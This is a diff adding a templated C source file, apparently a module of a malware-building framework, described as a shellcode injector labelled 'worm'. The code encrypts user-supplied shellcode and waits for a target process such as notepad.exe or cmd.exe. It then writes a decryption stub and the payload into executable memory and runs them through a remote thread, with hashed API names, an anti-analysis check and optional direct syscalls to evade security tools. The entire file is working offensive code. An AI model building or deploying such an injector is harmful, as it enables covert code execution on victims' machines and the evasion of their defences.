@@ -1,0 +1,154 @@
+#!name##Apple
+#!itemType##worm
+#!info##Shellcode Injector. It uses the LittleNemo library and NT winapi functions. It encrypts the shellcode, which is injected into a process along with a decryption function. Shellcode is decrypted and executed only within the target process.
+#!lang##c
+#!itemTags##WIN##EXE
+#!wormCompiler##Basic-C
+#!Wprocess##BasicProc
+#!inFile##LilNemo##little_nemo.h
+#!inFile##LilNemo_Core_H##little_nemo_core.h
+#!inFile##LilNemo_Core_C##little_nemo_core.c
+#!inFile##LilNemo_Food_H##little_nemo_food.h
+#!inFile##LilNemo_Food_C##little_nemo_food.c
+#!inFile##LilNemo_Bag_H##little_nemo_bag.h
+#!inFile##LilNemo_Bag_C##little_nemo_bag.c
+#!inFile##LilNemo_Candy_H##little_nemo_candy.h
+#!inFile##LilNemo_Candy_C##little_nemo_candy.c
+#!inFile##LilNemo_CandyAnti_H##lil_nemo_candy_anti.h
+#!inFile##LilNemo_CandyAnti_C##lil_nemo_candy_anti.c
+#!inFile##LilNemo_CandyInjector_H##lil_nemo_candy_injector.h
+#!inFile##LilNemo_CandyInjector_C##lil_nemo_candy_injector.c
+#!reqMod##LittleNemo##LittleNemoCandy
+#!Var##APL_target##notepad.exe, Notepad.exe, cmd.exe##Names of the processes into which the DLL will be injected.. Separate names with commas ","##str
+#!Var##APL_key##abcd##A key for hashing function names, offsets, etc. It may contain lowercase letters, uppercase letters, and numbers. Ex: dJ8uU6d, aBcD1234 etc.##str
+#!Var##APL_power##34##Additional parameter that modifies each character of the encryption key. Must be a integer.##str
+#!Var##APL_syscall##False##Specifies whether the Injector should use dynamically loaded syscalls or NT functions from ntdll for injection. Accepts True and False.##str
+#!preRT##_LNSHADOW##LilNemoShadow##APL_key##APL_power
+#!payloadSpace##APL_scode##Shellcode to execute.
+
+{% set _APPLE_TARGET = _LNSHADOW.convertToList(APL_target, ",") %}
+
+{% set _APPLE_KEY_PART = randTOOL.randomNumber(37, 198) %}
+
+{% if APL_syscall == "True" or APL_syscall == "TRUE" %}
+    {% set _APPLE_SYSCALL = 1 %}
+{% else %}
+    {% set _APPLE_SYSCALL = 0 %}
+{% endif %}
+
+#define LITTLE_NEMO_BAG
+#define LITTLE_NEMO_CANDY
+#define LITTLE_NEMO_CANDY_ANTI
+#define LITTLE_NEMO_CANDY_INJECTOR
+#include "little_nemo.h"
+#include <stdio.h>
+#include <stdint.h>
+#include <tlhelp32.h>
+
+
+#define LNA_APPLE_KEY_CHANGE {{_APPLE_KEY_PART}}
+#define LNA_APPLE_USE_SYSCALL {{_APPLE_SYSCALL}}
+
+pLNC_PAYLOAD_SHELLCODE_BASIC lna_bag_of_apple(void) {
+    uint16_t raddr[] = {
+        {{_LNSHADOW.encodeShellcode(APL_scode, APL_key)}}
+    };
+    pLNC_PAYLOAD_SHELLCODE_BASIC scode = malloc(sizeof(LNC_PAYLOAD_SHELLCODE_BASIC));
+    memset(scode, 0, sizeof(LNC_PAYLOAD_SHELLCODE_BASIC));
+    scode->shellcode_size = sizeof(raddr) / sizeof(uint16_t);
+    memcpy(scode->shellcode, raddr, sizeof(raddr));
+    return scode;
+}
+
+pLIL_NEMO_FOOD_LIST lna_get_garden_name(uint16_t **buff, uint16_t buff_size) {
+{{ _LNSHADOW.shadowList(_APPLE_TARGET) }}
+    pLIL_NEMO_FOOD_LIST flist = lil_nemo_food_make();
+    flist->size = malloc(sizeof(all_size));
+    memset(flist->size, 0, sizeof(all_size));
+    memcpy(flist->size, all_size, sizeof(all_size));
+    memset(buff, 0, buff_size * sizeof(uint16_t*));
+    memcpy(buff, all_addr, sizeof(all_addr));
+    flist->list_ptr = buff;
+    return flist;
+}
+
+uint16_t* lna_get_key(uint16_t key_part) {
+    uint16_t fake_key[] = {
+        {{_LNSHADOW.morphKey(_APPLE_KEY_PART)}}
+    };
+    int kid = 0;
+    while (fake_key[kid] != 0) {
+        kid++;
+    }
+    uint16_t *key = malloc((kid + 1) * sizeof(uint16_t));
+    memset(key, 0, (kid + 1) * sizeof(uint16_t));
+    for (int i=0; i<kid; i++) {
+        key[i] = fake_key[i] - key_part;
+    }
+    return key;
+}
+
+pLIL_NEMO_BAG lna_get_apple_bag(uint16_t *ekey, uint16_t *str_key) {
+    pLIL_NEMO_BAG bag = lil_nemo_bag_prepareNemo(ekey, str_key, 0, 8192, 0, 4096, 0, 2048, 0, 4096);
+    bag->addr_k32 = bag->find_dll(bag->raw_k32, bag);
+    bag->addr_ntdll = bag->find_dll(bag->raw_ntdll, bag);
+    if (!bag->addr_k32 || !bag->addr_ntdll) {
+        bag->clear(bag);
+        return 0;
+    }
+    return bag;
+}
+
+int lna_eat_apple(DWORD pid, pLIL_NEMO_BAG bag) {
+    HANDLE proc = lil_nemo_candy_open_process(pid, PROCESS_ALL_ACCESS, bag);
+    if (!proc) {
+        return 0;
+    }
+    pLNC_PAYLOAD_SHELLCODE_BASIC scode = lil_nemo_candy_prepare_shellcode(lna_bag_of_apple, 0, bag);
+    int func_size = (char*)lil_nemo_candy_func_inject_shellcode_end - (char*)lil_nemo_candy_func_inject_shellcode;
+    SIZE_T mem_padding = 256;
+    SIZE_T mem_size = scode->s_size + scode->shellcode_size + func_size + (3 * mem_padding);
+    SIZE_T func_off = scode->s_size + mem_padding;
+    SIZE_T scode_off = func_off + func_size + mem_padding;
+    PVOID alloc_mem = lil_nemo_candy_allocate_memory(proc, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, bag);
+    scode->target_ptr = (char*)alloc_mem + scode_off;
+    lil_nemo_candy_write_memory(proc, alloc_mem, scode, scode->s_size, bag);
+    PVOID tmem_func = (char*)alloc_mem + func_off;
+    lil_nemo_candy_write_memory(proc, tmem_func, (PVOID)lil_nemo_candy_func_inject_shellcode, func_size, bag);
+    HANDLE myTH = lil_nemo_candy_create_remote_thread(proc, tmem_func, alloc_mem, 0, bag);
+    void (*clhan)(HANDLE) = bag->get_func2(lil_nemo_food_NtClose, bag->addr_ntdll, bag);
+    clhan(proc);
+    free(scode);
+}
+
+
+int main(void) {
+    uint16_t kpart = lil_nemo_candy_anti_scout(LNA_APPLE_KEY_CHANGE);
+    if (kpart == 0) {
+        return 0;
+    };
+    uint16_t *ekey = lna_get_key(kpart);
+    uint16_t *str_key = lna_get_key(kpart);
+    pLIL_NEMO_BAG bag = lna_get_apple_bag(ekey, str_key);
+    if (!bag) {
+        return 0;
+    }
+    bag->FLAG_use_syscall = LNA_APPLE_USE_SYSCALL;
+    void *summer_time = bag->get_func2(lil_nemo_food_Sleep, bag->addr_k32, bag);
+    void (*stime)(DWORD) = summer_time;
+    DWORD pid;
+    while (1) {
+        pid = lil_nemo_candy_find_proc2(lna_get_garden_name, bag);
+        if (pid == 0) {
+            stime(3000);
+        }
+        else {
+            break;
+        }
+    }
+    int result = lna_eat_apple(pid, bag);
+    
+    bag->clear(bag);
+    return 0;
+}
+
